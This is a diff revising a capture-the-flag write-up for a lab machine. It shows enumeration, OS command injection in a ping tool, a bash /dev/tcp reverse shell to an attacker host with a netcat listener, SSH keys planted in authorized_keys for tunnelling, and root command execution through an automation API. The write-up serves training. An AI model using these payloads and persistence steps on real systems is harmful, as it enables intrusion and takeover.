@@ -8,80 +8,77 @@
 
 ## 1. Enumeration
 
-I started with directory enumeration using Gobuster:
+We start with a webpage:
+
+![web](image0.png)
+
+I did a normal Nmpap scan for open ports and services check:
 
 ```bash
-gobuster dir -u http://10.49.149.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,css,js,txt,xml
+sudo nmap -Pn -sV -sC -p- 10.48.140.10
 ```
 
-One of the interesting files I found was:
+I also did gobuster directory enumeration but couldn't find anything useful.
 
-```text
-/robots.txt
+![nmap](image1.png)
+
+```bash
+gobuster dir -u http://10.48.140.108 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,css,js,txt,xml
 ```
 
-It contained:
+![alt text](gobuster.png)
 
-```text
-User-agent: *
-Disallow: /internal/
-Disallow: /status
-```
+One of the interesting files I found was `robots.txt` which have disallowed entries:
+
+![robot](image3.png)
 
 Since `robots.txt` is not an access-control mechanism, I manually checked the interesting paths.
 
 I also found `/internal/netcheck` referenced in the application's JavaScript.
 
+![alt text](image4.png)
+
+It say that the `/status` page currently uses an old backend endpoint `/internal/netcheck`. Until the new authentication gateway is ready, restrictions are off.
+
+![alt text](image5.png)
+
+This looks like a network diagnostic tool which accepts an IP address and appears to run a `ping` command against it, displaying the raw output.
+
+![alt text](ping.png)
+
+So I simply searched `network diagnostic tool exploits` on google and got this:
+
+Command Injection: Web interfaces that execute system binaries (like ping.cgi or traceroute.cgi) via parameters that append malicious shell operators (;, &, or |).
+
 ---
 
 ## 2. Command Injection
 
-I sent a request to:
-
-```http
-POST /internal/netcheck
-```
-
-with:
-
-```text
-host=127.0.0.1
-```
-
-The response showed that the application was executing a `ping` command.
-
-I tested whether the parameter was injectable:
+I simply tested with a simple parameter to test if it have the vulnerability or not.
 
 ```text
 127.0.0.1;ls
 ```
 
-The response contained:
+The response:
 
-```text
-app.py
-requirements.txt
-static
-templates
-venv
-wsgi.py
-```
+![ping](image6.png)
 
 This confirmed **OS command injection**.
 
 ### Getting a shell
 
-I used the command injection to establish a reverse shell:
+I added a reverse shell command before the IP address and started a Netcat listener on my attack machine:
 
 ```text
-127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.135.65/4444 0>&1'
+127.0.0.1;bash -c 'bash -i >& /dev/tcp/ATTACKER IP/4444 0>&1'
 ```
-
-On my machine:
 
 ```bash
 nc -lvnp 4444
 ```
+
+![revshell](image7.png)
 
 The reverse shell connected successfully.
 
@@ -95,27 +92,25 @@ Once I had a shell, I searched for the user flag:
 find / -type f -name user.txt 2>/dev/null
 ```
 
-This returned:
-
-```text
-/home/web/user.txt
-```
-
-I read it with:
-
 ```bash
 cat /home/web/user.txt
 ```
 
+![alt text](image8.png)
+
 This gave me the **user flag**.
 
-At this point, I started looking for a privilege-escalation path.
+After that, I started looking for a privilege-escalation path.
 
 ---
 
 ## 4. Enumerating Internal Services
 
-While enumerating running processes, I noticed another service running as a different user:
+While enumerating, I found another user beside mine:
+
+![users](image9.png)
+
+So i though of checking some processes which might help us.
 
 ```bash
 ps auxww | grep watchtower
@@ -131,6 +126,8 @@ svc-watchtower ... /var/www/infinity_pool/watchtower/venv/bin/python3
 wsgi:app
 ```
 
+![alt text](image10.png)
+
 The important observation was:
 
 ```text
@@ -142,10 +139,30 @@ The service was only listening locally, so it wasn't directly accessible from my
 However, I already had a shell on the target, so I tested it locally:
 
 ```bash
+curl http://127.0.0.1:3000/
+```
+
+![api](image11.png)
+
+I found some interesting endpoints here:
+
+```text
+/api/health
+/api/conmfig
+```
+
+So I checked the endpoints:
+
+```bash
+curl http://127.0.0.1:3000/api/health
 curl http://127.0.0.1:3000/api/config
 ```
 
-This returned configuration information including:
+![health](image12.png)
+
+![config](image13.png)
+
+This returned a configuration information which gave me the credentials for the internal **FreePBX UCP** service.
 
 ```json
 {
@@ -158,8 +175,6 @@ This returned configuration information including:
 }
 ```
 
-This gave me credentials for the internal **FreePBX UCP** service.
-
 ---
 
 ## 5. Accessing FreePBX UCP
@@ -170,19 +185,23 @@ The FreePBX service was also bound to localhost:
 127.0.0.1:8080
 ```
 
-So I needed to tunnel the port through SSH.
+So what I needed was to tunnel the port through SSH, so I can access the FreePBX service on my browser.
 
 First, I generated an SSH key:
 
 ```bash
-ssh-keygen -t rsa -b 2048 -f ./infinite_key -N ""
+ssh-keygen -t rsa -b 2048 -f infinity_pool_key -N ""
 ```
 
-Then I encoded the public key:
+![key1](image14.png)
+
+Then I encoded the public key, can will be accepted by the authorized_keys folder:
 
 ```bash
-base64 -w0 infinite_key.pub
+base64 -w0 infinity_pool_key.pub
 ```
+
+![key2](image15.png)
 
 I added the public key to the `web` user's authorized keys:
 
@@ -196,8 +215,10 @@ chmod 600 /home/web/.ssh/authorized_keys
 I could then create the SSH tunnel:
 
 ```bash
-ssh -i infinite_key -L 8080:127.0.0.1:8080 web@<TARGET_IP>
+ssh -i infinity_pool_key -L 8080:127.0.0.1:8080 web@<TARGET_IP>
 ```
+
+![ssh](image16.png)
 
 Now the target's internal port 8080 was available through:
 
@@ -205,25 +226,25 @@ Now the target's internal port 8080 was available through:
 http://127.0.0.1:8080/ucp/
 ```
 
-I opened the FreePBX User Control Panel and logged in using the credentials obtained from `/api/config`.
+It opened the FreePBX Login Page.
+
+![login](image17.png)
+
+Using the credentials obtained from `/api/config`, I got access to the User Control Panel.
+
+![panel](image.png)
 
 ---
 
 ## 6. Finding the Automation Key
 
-The FreePBX dashboard initially appeared mostly empty.
+The FreePBX dashboard looked mostly empty.
 
-I created a dashboard and explored the available widgets.
+So I created a dashboard and explored the available widgets.
 
-Under the voicemail-related widgets, I found:
+I found a voicemail entry and a **Automation Key** inside a FreePBXUCPTemplateCreator widget.
 
-```text
-FreePBXUCPTemplateCreator
-```
-
-Adding the widget exposed a voicemail entry.
-
-The caller ID on that entry contained an **Automation Key**.
+![alt text](image19.png)
 
 This was an important clue because the earlier `/api/config` response had revealed:
 
@@ -243,8 +264,16 @@ So I now had both:
 Back on the target, I checked the service:
 
 ```bash
+curl -s http://127.0.0.1:9000/
+```
+
+There were nothing, so i changed the directories and eventually got this:
+
+```bash
 curl -s http://127.0.0.1:9000/health
 ```
+
+![alt text](image20.png)
 
 The response was extremely useful.
 
@@ -268,13 +297,7 @@ It documented an authenticated endpoint:
 }
 ```
 
-The most important piece was:
-
-```text
-"runs_as": "root"
-```
-
-The service was running with **root privileges**.
+The most important piece was `"runs_as": "root"` which tells us the service is running with **root privileges**.
 
 ---
 
@@ -290,9 +313,7 @@ curl -s -X POST -H "Authorization: Bearer $KEY" -H "Content-Type: application/js
 
 The response showed the command constructed by the application:
 
-```text
-tar czf /var/automation/exports/test.tgz /var/automation/data
-```
+![shell1](image21.png)
 
 This immediately stood out.
 
@@ -337,6 +358,8 @@ The important part was:
 ```text
 root flag
 ```
+
+![flag](image22.png)
 
 The command was executed by the root-owned automation service, giving me **root-level command execution**.
 
